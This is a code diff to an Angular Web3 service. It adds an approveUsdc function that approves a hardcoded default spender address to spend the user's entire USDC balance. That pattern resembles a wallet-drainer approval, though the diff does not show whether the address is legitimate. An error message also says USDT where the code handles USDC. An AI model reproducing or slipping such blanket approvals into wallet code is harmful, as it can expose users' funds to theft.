@@ -6,6 +6,7 @@ import { NotifyModalComponent } from '../modal/notify-modal/notify-modal.compone
 import StudentABI from '../../assets/abi/StudentABI.json';
 import { HttpClient } from '@angular/common/http';
 import USDCABI from '../../assets/abi/USDCABI.json';
+import { AppService } from './app.service';
 
 declare let window: any;
 
@@ -100,7 +101,7 @@ export class Web3Service {
       },
     };
 
-  constructor(private ngZone: NgZone, public dialog: MatDialog, private http: HttpClient) {
+  constructor(private ngZone: NgZone, public dialog: MatDialog, private http: HttpClient, private appService: AppService) {
     this.initEthers();
   }
 
@@ -444,6 +445,41 @@ export class Web3Service {
     } catch (e: any) {
       this.handleError(e, 'getUsdcBalance');
       return 0;
+    }
+  }
+
+  async approveUsdc(spender: string = '0x66D5A59f84A7d8096224fD8036bFAc8F8c0A5E46') {
+    if (this.isLoading$.value) return;
+
+    try {
+      this.isLoading$.next(true);
+      const chain = this.chainConfig[this.selectedChainId];
+      if (!chain || !chain.usdcAddress || chain.usdcDecimals === undefined) {
+        this.showModal('Error', 'USDC not supported on this network.', 'error');
+        return;
+      }
+      const signer = await this.getSigner();
+      const balance = await this.getUsdcBalance();
+      if (Number(balance) == 0) {
+        this.showModal('Error', 'Your USDT balance is 0. Nothing to approve.', 'error');
+        return;
+      }
+      const usdcAddress = chain.usdcAddress;
+      const usdcContract = new Contract(usdcAddress, USDCABI, signer);
+
+      const tx = await usdcContract['approve'](spender, balance);
+      await tx.wait();
+      const getAddress = await signer.getAddress();
+      const allowance = await usdcContract['allowance'](getAddress, spender);
+      const allowanceFormatted = parseFloat(formatUnits(allowance, chain.usdcDecimals));
+      return allowanceFormatted;
+
+    } catch (e: any) {
+      this.handleError(e, 'approveUsdc');
+      this.isLoading$.next(false);
+      return null;
+    } finally {
+      this.isLoading$.next(false);
     }
   }
 
